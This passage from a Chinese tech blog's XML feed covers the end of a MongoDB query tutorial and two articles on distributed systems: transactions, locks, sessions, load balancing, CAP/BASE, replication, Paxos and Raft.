Pitt&apos;, &apos;Edward Norton&apos;, &apos;Helena Bonham Carter&apos;], tags: &apos;drama&apos;, debut: new Date(1999,10,15,0,0), likes: 224360, dislikes: 40127, comments: [ &#123; user:&apos;user3&apos;, message: &apos;My first comment&apos;, dateCreated: new Date(2008,09,13,2,35), like: 0 &#125;, &#123; user:&apos;user2&apos;, message: &apos;My first comment too!&apos;, dateCreated: new Date(2003,10,11,6,20), like: 14 &#125;, &#123; user:&apos;user7&apos;, message: &apos;Good Movie!&apos;, dateCreated: new Date(2009,10,11,6,20), like: 2 &#125; ]&#125;,&#123; title: &apos;Seven&apos;, directed_by: &apos;David Fincher&apos;, stars: [&apos;Morgan Freeman&apos;, &apos;Brad Pitt&apos;, &apos;Kevin Spacey&apos;], tags: [&apos;drama&apos;,&apos;mystery&apos;,&apos;thiller&apos;], debut: new Date(1995,9,22,0,0), likes: 134370, dislikes: 1037, comments: [ &#123; user:&apos;user3&apos;, message: &apos;Love Kevin Spacey&apos;, dateCreated: new Date(2002,09,13,2,35), like: 0 &#125;, &#123; user:&apos;user2&apos;, message: &apos;Good works!&apos;, dateCreated: new Date(2013,10,21,6,20), like: 14 &#125;, &#123; user:&apos;user7&apos;, message: &apos;Good Movie!&apos;, dateCreated: new Date(2009,10,11,6,20), like: 2 &#125; ]&#125;]) 查询所有：1db.movie.find().pretty() 这里find()里面是空的，说明我们不做限制和筛选，类似于SQL没有WHERE语句一样。而pretty()输出的是经格式美化后的数据。 4、查询找出大卫芬奇(David Fincher)导演的所有电影： 1db.movie.find(&#123;&apos;directed_by&apos;:&apos;David Fincher&apos;&#125;).pretty() 找出大卫芬奇导演的, 摩根弗里曼主演的电影： 1db.movie.find(&#123;&apos;directed_by&apos;:&apos;David Fincher&apos;, &apos;stars&apos;:&apos;Morgan Freeman&apos;&#125;).pretty() 找出罗宾怀特或摩根弗里曼主演的电影： 1234567db.movie.find(&#123; $or: [ &#123;&apos;stars&apos;:&apos;Robin Wright&apos;&#125;, &#123;&apos;stars&apos;:&apos;Morgan Freeman&apos;&#125; ]&#125;).pretty() 还可以设置一个范围的搜索，比如找出50万人以上赞的电影： 1db.movie.find(&#123;&apos;likes&apos;:&#123;$gt:500000&#125;&#125;).pretty() 在这些查询里，key的单引号都是可选的： 1db.movie.find(&#123;likes:&#123;$gt:500000&#125;&#125;).pretty() 123db.movie.find(&#123;likes:&#123;$lt:200000&#125;&#125;).pretty()//$let:小于或等于；$get:大于或等于；$ne:不等于 对于包含多个值的key，同样可以用find来查询： 1db.movie.find(&#123;&apos;tags&apos;:&apos;romance&apos;&#125;) 如果你确切地知道返回的结果只有一个，也可以用findOne: 123db.movie.findOne(&#123;&apos;title&apos;:&apos;Forrest Gump&apos;&#125;)//如果有多个结果，则会按磁盘存储顺序返回第一个。请注意，findOne()自带pretty模式，所以不能再加pretty()，将报错。 只想显示其中一部分，可以用limit()和skip()，前者指明输出的个数，后者指明从第二个结果开始数： 123db.movie.find().limit(2).skip(1).pretty()//则跳过第一部，从第二部开始选取两部电影。 5、局部查询返回tags为drama的电影的名字和首映日期： 123db.movie.find(&#123;&apos;tags&apos;:&apos;drama&apos;&#125;,&#123;&apos;debut&apos;:1,&apos;title&apos;:1&#125;).pretty()//这里find的第二个参数是用来控制输出的，1表示要返回，而0则表示不返回。默认值是0 6、更新假设有人对《七宗罪》点了两个赞： 1db.movie.update(&#123;title:&apos;Seven&apos;&#125;, &#123;$inc:&#123;likes:2&#125;&#125;) 如果有多部符合要求的电影。则默认只会更新第一个。如果要多个同时更新，要设置{multi:true}： 123db.movie.update(&#123;&#125;, &#123;$inc:&#123;likes:10&#125;&#125;,&#123;multi:true&#125;)//所有电影的赞数都多了10 想在原有的值得基础上增加一个值的话，则应该用$push： 1db.movie.update(&#123;&apos;title&apos;:&apos;Seven&apos;&#125;, &#123;$push:&#123;&apos;tags&apos;:&apos;popular&apos;&#125;&#125;) 7、删除要删除标签为romance的电影 1db.movie.remove(&#123;&apos;tags&apos;:&apos;romance&apos;&#125;) 如果你只想删除第一个： 1db.movie.remove(&#123;&apos;tags&apos;:&apos;romance&apos;&#125;,1) 全部删除： 1db.movie.remove() 8、索引和排序比如我们要对导演这个key加索引： 123db.movie.ensureIndex(&#123;directed_by:1&#125;)//这里的1是升序索引，如果要降序索引，用-1 MongoDB支持对输出进行排序，比如按名字排序： 123db.movie.find().sort(&#123;&apos;title&apos;:1&#125;).pretty()//同样地，1是升序，-1是降序。默认是1。 1db.movie.getIndexes()//返回所有索引，包括其名字 1db.movie.dropIndex(&apos;index_name&apos;)//删除对应的索引 9、聚合类似于Mysql中的group by. 先执行如下命令： 1234567db.movie.update(&#123;title:&apos;Seven&apos;&#125;,&#123;$set:&#123;grade:1&#125;&#125;)db.movie.update(&#123;title:&apos;Forrest Gump&apos;&#125;,&#123;$set:&#123;grade:1&#125;&#125;)db.movie.update(&#123;title:&apos;Fight Club&apos;&#125;,&#123;$set:&#123;grade:2&#125;&#125;)这几条是给每部电影加一个虚拟的分级，前两部是归类是一级，后一部是二级。这里你也可以看到MongoDB的强大之处：可以动态地后续添加各种新项目。 123456789101112131415db.movie.aggregate([&#123;$group:&#123;_id:&apos;$grade&apos;&#125;&#125;])//按照grade聚合，返回结果是聚合的依据：&#123; &quot;_id&quot; : 2 &#125;&#123; &quot;_id&quot; : 1 &#125;如果按照导演名字聚合：db.movie.aggregate([&#123;$group:&#123;_id:&apos;$directed_by&apos;&#125;&#125;])返回结果就是聚合的依据：&#123; &quot;_id&quot; : &quot;David Fincher&quot; &#125;&#123; &quot;_id&quot; : &quot;Robert Zemeckis&quot; &#125; 12345678910111213141516171819202122232425db.movie.aggregate([&#123;$group:&#123;_id:&apos;$directed_by&apos;,num_movie:&#123;$sum:1&#125;&#125;&#125;])//找出每个导演的电影数输出：&#123; &quot;_id&quot; : &quot;David Fincher&quot;, &quot;num_movie&quot; : 2 &#125;&#123; &quot;_id&quot; : &quot;Robert Zemeckis&quot;, &quot;num_movie&quot; : 1 &#125;$sum后面的1表示只是把电影数加起来，但我们也可以统计别的数据，比如两位导演谁的赞比较多： db.movie.aggregate([&#123;$group:&#123;_id:&apos;$directed_by&apos;,num_likes:&#123;$sum:&apos;$likes&apos;&#125;&#125;&#125;]) 输出： &#123; &quot;_id&quot; : &quot;David Fincher&quot;, &quot;num_likes&quot; : 358753 &#125;&#123; &quot;_id&quot; : &quot;Robert Zemeckis&quot;, &quot;num_likes&quot; : 864377 &#125;除了$sum：统计平均的赞db.movie.aggregate([&#123;$group:&#123;_id:&apos;$directed_by&apos;,num_movie:&#123;$avg:&apos;$likes&apos;&#125;&#125;&#125;])返回每个导演电影中的第一部的赞数：db.movie.aggregate([&#123;$group:&#123;_id:&apos;$directed_by&apos;,num_movie:&#123;$first:&apos;$likes&apos;&#125;&#125;&#125;] 10、原子性123456db.movie.findAndModify( &#123; query:&#123;&apos;title&apos;:&apos;Forrest Gump&apos;&#125;, update:&#123;$inc:&#123;likes:10&#125;&#125; &#125; ) 11、文本搜索假定我们要对标题进行文本搜索 1db.movie.ensureIndex(&#123;title:&apos;text&apos;&#125;) 接着我们就可以对标题进行文本搜索了，比如，查找带有”Gump”的标题： 123db.movie.find(&#123;$text:&#123;$search:&quot;Gump&quot;&#125;&#125;).pretty()假设我们要搜索的key是一个长长的文档，这种text search的方便性就显现出来了。MongoDB目前支持15种语言的文本搜索。 12、正则表达式查找标题以b结尾的电影信息： 123db.movie.find(&#123;title:&#123;$regex:&apos;.*b$&apos;&#125;&#125;).pretty()db.movie.find(&#123;title:/.*b$/&#125;).pretty() 查找含有’Fight’标题的电影： 1db.movie.find(&#123;title:/Fight/&#125;).pretty() 注意以上匹配都是区分大小写的，如果你要让其不区分大小写，则可以： 123db.movie.find(&#123;title:&#123;$regex:&apos;fight.*b&apos;,$options:&apos;$i&apos;&#125;&#125;).pretty()$i是insensitive的意思。这样的话，即使是小写的fight，也能搜到了。 参考链接：https://github.com/StevenSLXie/Tutorials-for-Web-Developers/blob/master/MongoDB%20%E6%9E%81%E7%AE%80%E5%AE%9E%E8%B7%B5%E5%85%A5%E9%97%A8.md]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式问题分析]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%88%86%E5%B8%83%E5%BC%8F%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[本篇讲述分布式问题分析。 一、分布式事务指事务的操作位于不同的节点上，需要保证事务的 AICD 特性。例如在下单场景下，库存和订单如果不在同一个节点上，就需要涉及分布式事务。 两阶段提交协议Two-phase Commit（2PC）。 两类节点：协调者（Coordinator）和参与者（Participants），协调者只有一个，参与者可以有多个。 1. 运行过程① 准备阶段：协调者询问参与者事务是否执行成功； ② 提交阶段：如果事务在每个参与者上都执行成功，协调者发送通知让参与者提交事务；否则，协调者发送通知让参与者回滚事务。 需要注意的是，在准备阶段，参与者执行了事务，但是还未提交。只有在提交阶段接收到协调者发来的通知后，才进行提交或者回滚。 2. 分析2PC 可以保证强一致性，但是因为在准备阶段协调者需要等待所有参与者的结果才能进入提交阶段，因此可用性差。 3. 存在的问题 参与者发生故障。解决方案：可以给事务设置一个超时时间，如果某个参与者一直不响应，那么认为事务执行失败。 协调者发生故障。解决方案：将操作日志同步到备用协调者，让备用协调者接替后续工作。 4. XA 协议XA 协议是多数数据库的 2PC 协议的实现，包含了事务管理器和本地资源管理器。 本地消息1. 原理本地消息表与业务数据表处于同一个数据库中，这样就能利用本地事务来保证在对这两个表的操作满足事务特性。 在分布式事务操作的一方，它完成写业务数据的操作之后向本地消息表发送一个消息，本地事务能保证这个消息一定会被写入本地消息表中。 之后将本地消息表中的消息转发到 Kafka 等消息队列（MQ）中，如果转发成功则将消息从本地消息表中删除，否则继续重新转发。 在分布式事务操作的另一方从消息队列中读取一个消息，并执行消息中的操作。 2. 分析本地消息表利用了本地事务来实现分布式事务，并且使用了消息队列来保证最终一致性。 二、分布式锁可以使用 Java 提供的内置锁来实现进程同步：由 JVM 实现的 synchronized 和 JDK 提供的 Lock。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁来同步。 原理锁可以有阻塞锁和乐观锁两种实现方式，这里主要探讨阻塞锁实现。阻塞锁通常使用互斥量来实现，互斥量为 1 表示有其它进程在使用锁，此时处于锁定状态，互斥量为 0 表示未锁定状态。1 和 0 可以用一个整型值来存储，也可以用某个数据存在或者不存在来存储，某个数据存在表示互斥量为 1，也就是锁定状态。 实现1. 数据库的唯一索引当想要获得锁时，就向表中插入一条记录，释放锁时就删除这条记录。唯一索引可以保证该记录只被插入一次，那么就可以用这个记录是否存在来判断是否存于锁定状态。 这种方式存在以下几个问题： 锁没有失效时间，解锁失败会导致死锁，其他线程无法再获得锁。 只能是非阻塞锁，插入失败直接就报错了，无法重试。 不可重入，同一线程在没有释放锁之前无法再获得锁。 2. Redis 的 SETNX 指令使用 SETNX（set if not exist）指令插入一个键值对，如果 Key 已经存在，那么会返回 False，否则插入成功并返回 True。 SETNX 指令和数据库的唯一索引类似，可以保证只存在一个 Key 的键值对，可以用一个 Key 的键值对是否存在来判断是否存于锁定状态。 EXPIRE 指令可以为一个键值对设置一个过期时间，从而避免了死锁的发生。 3. Redis 的 RedLock 算法使用了多个 Redis 实例来实现分布式锁，这是为了保证在发生单点故障时仍然可用。 尝试从 N 个相互独立 Redis 实例获取锁，如果一个实例不可用，应该尽快尝试下一个。 计算获取锁消耗的时间，只有当这个时间小于锁的过期时间，并且从大多数（N/2+1）实例上获取了锁，那么就认为锁获取成功了。 如果锁获取失败，会到每个实例上释放锁。 4. Zookeeper 的有序节点Zookeeper 是一个为分布式应用提供一致性服务的软件，例如配置管理、分布式协同以及命名的中心化等，这些都是分布式系统中非常底层而且是必不可少的基本功能，但是如果自己实现这些功能而且要达到高吞吐、低延迟同时还要保持一致性和可用性，实际上非常困难。 （一）抽象模型 Zookeeper 提供了一种树形结构级的命名空间，/app1/p_1 节点表示它的父节点为 /app1。 （二）节点类型 永久节点：不会因为会话结束或者超时而消失； 临时节点：如果会话结束或者超时就会消失； 有序节点：会在节点名的后面加一个数字后缀，并且是有序的，例如生成的有序节点为 /lock/node-0000000000，它的下一个有序节点则为 /lock/node-0000000001，依次类推。 （三）监听器 为一个节点注册监听器，在节点状态发生改变时，会给客户端发送消息。 （四）分布式锁实现 创建一个锁目录 /lock； 在 /lock 下创建临时的且有序的子节点，第一个客户端对应的子节点为 /lock/lock-0000000000，第二个为 /lock/lock-0000000001，以此类推； 客户端获取 /lock 下的子节点列表，判断自己创建的子节点是否为当前子节点列表中序号最小的子节点，如果是则认为获得锁；否则监听自己的前一个子节点，获得子节点的变更通知后重复此步骤直至获得锁； 执行业务代码，完成后，删除对应的子节点。 （五）会话超时 如果一个已经获得锁的会话超时了，因为创建的是临时节点，所以该会话对应的临时节点会被删除，其它会话就可以获得锁了。可以看到，Zookeeper 分布式锁不会出现数据库的唯一索引实现分布式锁的死锁问题。 （六）羊群效应 一个节点未获得锁，需要监听自己的前一个子节点，这是因为如果监听所有的子节点，那么任意一个子节点状态改变，其它所有子节点都会收到通知（羊群效应），而我们只希望它的后一个子节点收到通知。 三、分布式 Session在分布式场景下，一个用户的 Session 如果只存储在一个服务器上，那么当负载均衡器把用户的下一个请求转发到另一个服务器上，该服务器没有用户的 Session，就可能导致用户需要重新进行登录等操作。 1. Sticky Sessions需要配置负载均衡器，使得一个用户的所有请求都路由到一个服务器节点上，这样就可以把用户的 Session 存放在该服务器节点中。 缺点：当服务器节点宕机时，将丢失该服务器节点上的所有 Session。 2. Session Replication在服务器节点之间进行 Session 同步操作，这样的话用户可以访问任何一个服务器节点。 缺点：需要更好的服务器硬件条件；需要对服务器进行配置。 3. Persistent DataStore将 Session 信息持久化到一个数据库中。 缺点：有可能需要去实现存取 Session 的代码。 4. In-Memory DataStore可以使用 Redis 和 Memcached 这种内存型数据库对 Session 进行存储，可以大大提高 Session 的读写效率。内存型数据库同样可以持久化数据到磁盘中来保证数据的安全性。 四、负载均衡算法1. 轮询（Round Robin）轮询算法把每个请求轮流发送到每个服务器上。下图中，一共有 6 个客户端产生了 6 个请求，这 6 个请求按 (1, 2, 3, 4, 5, 6) 的顺序发送。最后，(1, 3, 5) 的请求会被发送到服务器 1，(2, 4, 6) 的请求会被发送到服务器 2。 该算法比较适合每个服务器的性能差不多的场景，如果有性能存在差异的情况下，那么性能较差的服务器可能无法承担过大的负载（下图的 Server 2）。 2. 加权轮询（Weighted Round Robbin）加权轮询是在轮询的基础上，根据服务器的性能差异，为服务器赋予一定的权值。例如下图中，服务器 1 被赋予的权值为 5，服务器 2 被赋予的权值为 1，那么 (1, 2, 3, 4, 5) 请求会被发送到服务器 1，(6) 请求会被发送到服务器 2。 3. 最少连接（least Connections）由于每个请求的连接时间不一样，使用轮询或者加权轮询算法的话，可能会让一台服务器当前连接数过大，而另一台服务器的连接过小，造成负载不均衡。例如下图中，(1, 3, 5) 请求会被发送到服务器 1，但是 (1, 3) 很快就断开连接，此时只有 (5) 请求连接服务器 1；(2, 4, 6) 请求被发送到服务器 2，只有 (2) 的连接断开。该系统继续运行时，服务器 2 会承担过大的负载。 最少连接算法就是将请求发送给当前最少连接数的服务器上。例如下图中，服务器 1 当前连接数最小，那么新到来的请求 6 就会被发送到服务器 1 上。 4. 加权最少连接（Weighted Least Connection）在最少连接的基础上，根据服务器的性能为每台服务器分配权重，再根据权重计算出每台服务器能处理的连接数。 5. 随机算法（Random）把请求随机发送到服务器上。和轮询算法类似，该算法比较适合服务器性能差不多的场景。 6. 源地址哈希法 (IP Hash)源地址哈希通过对客户端 IP 哈希计算得到的一个数值，用该数值对服务器数量进行取模运算，取模结果便是目标服务器的序号。 优点：保证同一 IP 的客户端都会被 hash 到同一台服务器上。 缺点：不利于集群扩展，后台服务器数量变更都会影响 hash 结果。可以采用一致性 Hash 改进。 实现1. HTTP 重定向HTTP 重定向负载均衡服务器收到 HTTP 请求之后会返回服务器的地址，并将该地址写入 HTTP 重定向响应中返回给浏览器，浏览器收到后需要再次发送请求。 缺点： 用户访问的延迟会增加； 如果负载均衡器宕机，就无法访问该站点。 2. DNS 重定向使用 DNS 作为负载均衡器，根据负载情况返回不同服务器的 IP 地址。大型网站基本使用了这种方式做为第一级负载均衡手段，然后在内部使用其它方式做第二级负载均衡。 缺点： DNS 查找表可能会被客户端缓存起来，那么之后的所有请求都会被重定向到同一个服务器。 3. 修改 MAC 地址使用 LVS（Linux Virtual Server）这种链路层负载均衡器，根据负载情况修改请求的 MAC 地址。 4. 修改 IP 地址在网络层修改请求的目的 IP 地址。 5. 代理自动配置正向代理与反向代理的区别： 正向代理：发生在客户端，是由用户主动发起的。比如翻墙，客户端通过主动访问代理服务器，让代理服务器获得需要的外网数据，然后转发回客户端。 反向代理：发生在服务器端，用户不知道代理的存在。 PAC 服务器是用来判断一个请求是否要经过代理。 转自： 分布式问题分析]]></content>
      <tags>
        <tag>计算机网络及其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式基础]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%88%86%E5%B8%83%E5%BC%8F%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[本篇讲述分布式基础。 一、基本概念异常1. 服务器宕机内存错误、服务器停电等都会导致服务器宕机，此时节点无法正常工作，称为不可用。 服务器宕机会导致节点失去所有内存信息，因此需要将内存信息保存到持久化介质上。 2. 网络异常有一种特殊的网络异常称为 网络分区 ，即集群的所有节点被划分为多个区域，每个区域内部可以通信，但是区域之间无法通信。 3. 磁盘故障磁盘故障是一种发生概率很高的异常。 使用冗余机制，将数据存储到多台服务器。 超时在分布式系统中，一个请求除了成功和失败两种状态，还存在着超时状态。 可以将服务器的操作设计为具有 幂等性 ，即执行多次的结果与执行一次的结果相同。如果使用这种方式，当出现超时的时候，可以不断地重新请求直到成功。 衡量指标1. 性能常见的性能指标有：吞吐量、响应时间。 其中，吞吐量指系统在某一段时间可以处理的请求总数，通常为每秒的读操作数或者写操作数；响应时间指从某个请求发出到接收到返回结果消耗的时间。 这两个指标往往是矛盾的，追求高吞吐的系统，往往很难做到低响应时间，解释如下： 在无并发的系统中，吞吐量为响应时间的倒数，例如响应时间为 10 ms，那么吞吐量为 100 req/s，因此高吞吐也就意味着低响应时间。 但是在并发的系统中，由于一个请求在调用 I/O 资源的时候，需要进行等待。服务器端一般使用的是异步等待方式，即等待的请求被阻塞之后不需要一直占用 CPU 资源。这种方式能大大提高 CPU 资源的利用率，例如上面的例子中，单个请求在无并发的系统中响应时间为 10 ms，如果在并发的系统中，那么吞吐量将大于 100 req/s。因此为了追求高吞吐量，通常会提高并发程度。但是并发程度的增加，会导致请求的平均响应时间也增加，因为请求不能马上被处理，需要和其它请求一起进行并发处理，响应时间自然就会增高。 2. 可用性可用性指系统在面对各种异常时可以提供正常服务的能力。可以用系统可用时间占总时间的比值来衡量，4 个 9 的可用性表示系统 99.99% 的时间是可用的。 3. 一致性可以从两个角度理解一致性：从客户端的角度，读写操作是否满足某种特性；从服务器的角度，多个数据副本之间是否一致。 4. 可扩展性指系统通过扩展集群服务器规模来提高性能的能力。理想的分布式系统需要实现“线性可扩展”，即随着集群规模的增加，系统的整体性能也会线性增加。 二、数据分布分布式存储系统的数据分布在多个节点中，常用的数据分布方式有哈希分布和顺序分布。 数据库的水平切分（Sharding）也是一种分布式存储方法，下面的数据分布方法同样适用于 Sharding。 哈希分布哈希分布就是将数据计算哈希值之后，按照哈希值分配到不同的节点上。例如有 N 个节点，数据的主键为 key，则将该数据分配的节点序号为：hash(key)%N。 传统的哈希分布算法存在一个问题：当节点数量变化时，也就是 N 值变化，那么几乎所有的数据都需要重新分布，将导致大量的数据迁移。 一致性哈希 Distributed Hash Table（DHT）：对于哈希空间 [0, 2n-1]，将该哈希空间看成一个哈希环，将每个节点都配置到哈希环上。每个数据对象通过哈希取模得到哈希值之后，存放到哈希环中顺时针方向第一个大于等于该哈希值的节点上。 一致性哈希的优点是在增加或者删除节点时只会影响到哈希环中相邻的节点，例如下图中新增节点 X，只需要将数据对象 C 重新存放到节点 X 上即可，对于节点 A、B、D 都没有影响。 顺序分布哈希分布式破坏了数据的有序性，顺序分布则不会。 顺序分布的数据划分为多个连续的部分，按数据的 ID 或者时间分布到不同节点上。例如下图中，User 表的 ID 范围为 1 ~ 7000，使用顺序分布可以将其划分成多个子表，对应的主键范围为 1 ~ 1000，1001 ~ 2000，…，6001 ~ 7000。 顺序分布的优点是可以充分利用每个节点的空间，而哈希分布很难控制一个节点存储多少数据。 但是顺序分布需要使用一个映射表来存储数据到节点的映射，这个映射表通常使用单独的节点来存储。当数据量非常大时，映射表也随着变大，那么一个节点就可能无法存放下整个映射表。并且单个节点维护着整个映射表的开销很大，查找速度也会变慢。为了解决以上问题，引入了一个中间层，也就是 Meta 表，从而分担映射表的维护工作。 负载均衡衡量负载的因素很多，如 CPU、内存、磁盘等资源使用情况、读写请求数等。 分布式系统存储应当能够自动负载均衡，当某个节点的负载较高，将它的部分数据迁移到其它节点。 每个集群都有一个总控节点，其它节点为工作节点，由总控节点根据全局负载信息进行整体调度，工作节点定时发送心跳包（Heartbeat）将节点负载相关的信息发送给总控节点。 一个新上线的工作节点，由于其负载较低，如果不加控制，总控节点会将大量数据同时迁移到该节点上，造成该节点一段时间内无法工作。因此负载均衡操作需要平滑进行，新加入的节点需要较长的一段时间来达到比较均衡的状态。 三、复制复制原理复制是保证分布式系统高可用的基础，让一个数据存储多个副本，当某个副本所在的节点出现故障时，能够自动切换到其它副本上，从而实现故障恢复。 多个副本通常有一个为主副本，其它为备副本。主副本用来处理写请求，备副本主要用来处理读请求，实现读写分离。 主副本将同步操作日志发送给备副本，备副本通过回放操作日志获取最新修改。 复制协议主备副本之间有两种复制协议，一种是强同步复制协议，一种是异步复制协议。 1. 强同步复制协议要求主副本将同步操作日志发给备副本之后进行等待，要求至少一个备副本返回成功后，才开始修改主副本，修改完成之后通知客户端操作成功。 优点：至少有一个备副本拥有完整的数据，出现故障时可以安全地切换到该备副本，因此一致性好。 缺点：可用性差，因为主副本需要等待，那么整个分布式系统的可用时间就会降低。 2. 异步复制协议主副本将同步操作日志发给备副本之后不需要进行等待，直接修改主副本并通知客户端操作成功。 优点：可用性好。 缺点：一致性差。 CAP分布式存储系统不可能同时满足一致性（C：Consistency）、可用性（A：Availability）和分区容忍性（P：Partition tolerance），最多只能同时满足其中两项。 在设计分布式系统时，需要根据实际需求弱化某一要求。因此就有了下图中的三种设计：CA、CP 和 AP。 需要注意的是，分区容忍性必不可少，因为需要总是假设网络是不可靠的，并且系统需要能够自动容错，因此实际上设计分布式存储系统需要在一致性和可用性之间做权衡。上一节介绍的强同步协议和异步复制协议就是在一致性和可用性做权衡得到的结果。 BASEBASE 是 Basically Available（基本可用）、Soft State（软状态）和 Eventually Consistent（最终一致性）三个短语的缩写。BASE 理论是对 CAP 中一致性和可用性权衡的结果，是基于 CAP 定理逐步演化而来的。BASE 理论的核心思想是：即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。 1. 基本可用指分布式系统在出现故障的时候，保证核心可用，允许损失部分可用性。 例如，电商在做促销时，服务层可能只提供降级服务，部分用户可能会被引导到降级页面上。 2. 软状态指允许系统存在中间状态，而该中间状态不会影响系统整体可用性，即不同节点的数据副本之间进行同步的过程允许存在延时。 3. 最终一致性一致性模型包含以下三种： 强一致性：新数据写入之后，在任何数据副本上都能读取到最新值； 弱一致性：新数据写入之后，不能保证在数据副本上能读取到最新值； 最终一致性：新数据写入之后，只能保证过了一个时间窗口后才能在数据副本上读取到最新值； 强一致性通常运用在需要满足 ACID 的传统数据库系统上，而最终一致性通常运用在大型分布式系统中。应该注意的是，上面介绍的强同步复制协议和异步复制协议都不能保证强一致性，因为它们是分布式系统的复制协议。这两种复制协议如果要满足最终一致性，还需要多加一些控制。 在实际的分布式场景中，不同业务单元和组件对一致性的要求是不同的，因此 ACID 和 BASE 往往会结合在一起使用。 四、容错分布式系统故障发生的概率很大，为了实现高可用以及减少人工运维成本，需要实现自动化容错。 故障检测通过 租约机制 来对故障进行检测。假设节点 A 为主控节点，节点 A 向节点 B 发送租约，节点 B 在租约规定的期限内才能提供服务。期限快到达时，节点 B 需要向 A 重新申请租约。 如果过期，那么 B 不再提供服务，并且 A 也能知道 B 此时可能发生故障并已经停止服务。可以看到，通过这种机制，A 和 B 都能对 B 发生故障这一事实达成一致。 故障恢复当某个节点故障时，就将它上面的服务迁移到其它节点。 五、一致性协议Paxos 协议用于达成共识性问题，即对多个节点产生的值，该算法能保证只选出唯一一个值。 主要有三类节点： 提议者（Proposer）：提议一个值； 接受者（Acceptor）：对每个提议进行投票； 告知者（Learner）：被告知投票的结果，不参与投票过程。 1. 执行过程规定一个提议包含两个字段：[n, v]，其中 n 为序号（具有唯一性），v 为提议值。 下图演示了两个 Proposer 和三个 Acceptor 的系统中运行该算法的初始过程，每个 Proposer 都会向所有 Acceptor 发送提议请求。 当 Acceptor 接收到一个提议请求，包含的提议为 [n1, v1]，并且之前还未接收过提议请求，那么发送一个提议响应，设置当前接收到的提议为 [n1, v1]，并且保证以后不会再接受序号小于 n1 的提议。 如下图，Acceptor X 在收到 [n=2, v=8] 的提议请求时，由于之前没有接收过提议，因此就发送一个 [no previous] 的提议响应，设置当前接收到的提议为 [n=2, v=8]，并且保证以后不会再接受序号小于 2 的提议。其它的 Acceptor 类似。 如果 Acceptor 接收到一个提议请求，包含的提议为 [n2, v2]，并且之前已经接收过提议 [n1, v1]。如果 n1 &gt; n2，那么就丢弃该提议请求；否则，发送提议响应，该提议响应包含之前已经接收过的提议 [n1, v1]，设置当前接收到的提议为 [n2, v2]，并且保证以后不会再接受序号小于 n2 的提议。 如下图，Acceptor Z 收到 Proposer A 发来的 [n=2, v=8] 的提议请求，由于之前已经接收过 [n=4, v=5] 的提议，并且 n &gt; 2，因此就抛弃该提议请求；Acceptor X 收到 Proposer B 发来的 [n=4, v=5] 的提议请求，因为之前接收到的提议为 [n=2, v=8]，并且 2 &lt;= 4，因此就发送 [n=2, v=8] 的提议响应，设置当前接收到的提议为 [n=4, v=5]，并且保证以后不会再接受序号小于 4 的提议。Acceptor Y 类似。 当一个 Proposer 接收到超过一半 Acceptor 的提议响应时，就可以发送接受请求。 Proposer A 接收到两个提议响应之后，就发送 [n=2, v=8] 接受请求。该接受请求会被所有 Acceptor 丢弃，因为此时所有 Acceptor 都保证不接受序号小于 4 的提议。 Proposer B 过后也收到了两个提议响应，因此也开始发送接受请求。需要注意的是，接受请求的 v 需要取它收到的最大 v 值，也就是 8。因此它发送 [n=4, v=8] 的接受请求。 Acceptor 接收到接受请求时，如果序号大于等于该 Acceptor 承诺的最小序号，那么就发送通知给所有的 Learner。当 Learner 发现有大多数的 Acceptor 接收了某个提议，那么该提议的提议值就被 Paxos 选择出来。 2. 约束条件（一）正确性 指只有一个提议值会生效。 因为 Paxos 协议要求每个生效的提议被多数 Acceptor 接收，并且 Acceptor 不会接受两个不同的提议，因此可以保证正确性。 （二）可终止性 指最后总会有一个提议生效。 Paxos 协议能够让 Proposer 发送的提议朝着能被大多数 Acceptor 接受的那个提议靠拢，因此能够保证可终止性。 Raft 协议Raft 和 Paxos 类似，但是更容易理解，也更容易实现。 Raft 主要是用来竞选主节点。 1. 单个 Candidate 的竞选有三种节点：Follower、Candidate 和 Leader。Leader 会周期性的发送心跳包给 Follower。每个 Follower 都设置了一个随机的竞选超时时间，一般为 150ms~300ms，如果在这个时间内没有收到 Leader 的心跳包，就会变成 Candidate，进入竞选阶段。 下图表示一个分布式系统的最初阶段，此时只有 Follower，没有 Leader。Follower A 等待一个随机的竞选超时时间之后，没收到 Leader 发来的心跳包，因此进入竞选阶段。 此时 A 发送投票请求给其它所有节点。 其它节点会对请求进行回复，如果超过一半的节点回复了，那么该 Candidate 就会变成 Leader。 之后 Leader 会周期性地发送心跳包给 Follower，Follower 接收到心跳包，会重新开始计时。 2. 多个 Candidate 竞选 如果有多个 Follower 成为 Candidate，并且所获得票数相同，那么就需要重新开始投票，例如下图中 Candidate B 和 Candidate D 都获得两票，因此需要重新开始投票。 ![image](http://xiaozhao.oursnail.cn/%E5%A4%9A%E4%B8%AACandidate%E7%AB%9E%E9%80%891.gif 当重新开始投票时，由于每个节点设置的随机竞选超时时间不同，因此能下一次再次出现多个 Candidate 并获得同样票数的概率很低。 3. 日志复制 来自客户端的修改都会被传入 Leader。注意该修改还未被提交，只是写入日志中。 Leader 会把修改复制到所有 Follower。 Leader 会等待大多数的 Follower 也进行了修改，然后才将修改提交。 此时 Leader 会通知的所有 Follower 让它们也提交修改，此时所有节点的值达成一致。 拜占庭将军问题 拜占庭将军问题深入探讨 六、CDN 架构通过将内容发布到靠近用户的边缘节点，使不同地域的用户在访问相同网页时可以就近获取。不仅可以减轻服务器的负担，也可以提高用户的访问速度。 从下图可以看出，DNS 在对域名解析时不再向用户返回源服务器的 IP 地址，而是返回边缘节点的 IP 地址，所以用户最终访问的是边缘节点。边缘节点会先从源服务器中获取用户所需的数据，如果请求成功，边缘节点会将页面缓存下来，下次用户访问时可以直接读取。 转自： 分布式基础]]></content>
      <tags>
        <tag>计算机网络及其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于索引失效和联合索引]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%85%B3%E4%BA%8E%E7%B4%A2%E5%BC%95%E5%A4%B1%E6%95%88%E5%92%8C%E8%81%94%E5%90%88%E7%B4%A2%E5%BC%95%2F</url>
